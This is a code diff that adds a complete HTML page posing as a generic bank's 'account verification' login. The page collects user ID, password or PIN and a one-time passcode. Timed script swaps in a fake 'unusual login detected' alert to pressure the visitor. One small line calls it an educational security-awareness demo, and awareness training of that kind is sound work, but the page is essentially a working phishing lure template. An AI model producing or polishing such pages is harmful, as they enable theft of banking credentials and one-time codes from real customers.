@@ -1,1 +1,279 @@
 [COPY THE ENTIRE HTML CODE ABOVE]
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Banking - Account Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: #f7f9fc;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e1e8ed;
+        }
+        .bank-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4a90e2;
+            margin-bottom: 10px;
+        }
+        .header h2 {
+            color: #e74c3c;
+            font-size: 18px;
+        }
+        .header p {
+            color: #657786;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #14171a;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e1e8ed;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #4a90e2;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .checkbox-group input {
+            width: auto;
+        }
+        .checkbox-group label {
+            margin-bottom: 0;
+        }
+        .forgot-links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .forgot-links a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+        .forgot-links a:hover {
+            text-decoration: underline;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #4a90e2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #357abd;
+        }
+        .security-badge {
+            background: #f0f3f7;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #657786;
+        }
+        .alert-banner {
+            background: #e8f4fd;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #4a90e2;
+            text-align: center;
+        }
+        .footer {
+            background: #f7f9fc;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #8899a6;
+            border-top: 1px solid #e1e8ed;
+        }
+        .help-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+        .help-links a {
+            color: #4a90e2;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .warning-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .otp-group {
+            display: none;
+            margin-bottom: 20px;
+        }
+        .device-option {
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="bank-logo">SECURE BANKING</div>
+                <h2>Account Verification Required</h2>
+                <p>Enhanced security check for your protection</p>
+            </div>
+            <div class="content">
+                <div class="alert-banner">
+                    Real-Time Security Alert: We'll send you a notification after successful login
+                </div>
+                
+                <form action="/login" method="POST">
+                    <div class="input-group">
+                        <label>User ID / Username</label>
+                        <input type="text" name="username" placeholder="Enter your username or user ID" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Password / PIN</label>
+                        <input type="password" name="password" placeholder="Enter your password or PIN" required>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" name="remember_device" id="remember_device">
+                        <label for="remember_device">Remember This Device - Skip OTP for 30 days on this trusted device</label>
+                    </div>
+                    
+                    <div class="forgot-links">
+                        <a href="#">Forgot User ID?</a>
+                        <a href="#">Forgot Password / PIN?</a>
+                    </div>
+                    
+                    <div class="otp-group" id="otpGroup">
+                        <label>One-Time Passcode (OTP)</label>
+                        <input type="text" name="otp" placeholder="Enter 6-digit code sent via SMS/Email" maxlength="6">
+                        <small style="color: #657786; display: block; margin-top: 5px;">Enter the code sent to your registered mobile or email</small>
+                    </div>
+                    
+                    <div class="device-option">
+                        <label>Hardware Compatibility</label>
+                        <select name="device_type">
+                            <option value="browser">Web Browser</option>
+                            <option value="mobile_app">Mobile Banking App</option>
+                            <option value="web_atm">Web ATM (Card Reader Required)</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit">Secure Login & Verify Identity</button>
+                </form>
+                
+                <div class="security-badge">
+                    Multi-Factor Authentication | Real-Time Alerts | Encrypted Connection
+                </div>
+                
+                <div class="help-links">
+                    <a href="#">Help Center</a>
+                    <a href="#">Digital Assistant</a>
+                    <a href="#">Contact Support</a>
+                    <a href="#">New User? Register</a>
+                </div>
+                
+                <div class="warning-text">
+                    EDUCATIONAL DEMO - Security Awareness Training
+                </div>
+            </div>
+            <div class="footer">
+                This security check helps protect your account from unauthorized access
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Show OTP field after 3 clicks (simulating MFA request)
+        let clickCount = 0;
+        const form = document.querySelector('form');
+        
+        form.addEventListener('click', function(e) {
+            clickCount++;
+            if(clickCount === 3) {
+                document.getElementById('otpGroup').style.display = 'block';
+            }
+        });
+        
+        // Show security alert simulation
+        const alertBanner = document.querySelector('.alert-banner');
+        setTimeout(function() {
+            alertBanner.style.background = '#ffebee';
+            alertBanner.style.color = '#c62828';
+            alertBanner.innerHTML = 'Security Notice: Unusual login detected from new device. Additional verification required.';
+        }, 5000);
+        
+        // Simulate "Remember Device" message
+        document.getElementById('remember_device').addEventListener('change', function() {
+            if(this.checked) {
+                const msg = document.createElement('div');
+                msg.style.background = '#e8f5e9';
+                msg.style.padding = '8px';
+                msg.style.borderRadius = '4px';
+                msg.style.marginTop = '10px';
+                msg.style.fontSize = '11px';
+                msg.style.textAlign = 'center';
+                msg.innerHTML = 'This device will be trusted for 30 days. You may skip OTP on future logins.';
+                this.parentNode.appendChild(msg);
+                setTimeout(() => msg.remove(), 3000);
+            }
+        });
+    </script>
+</body>
+</html>
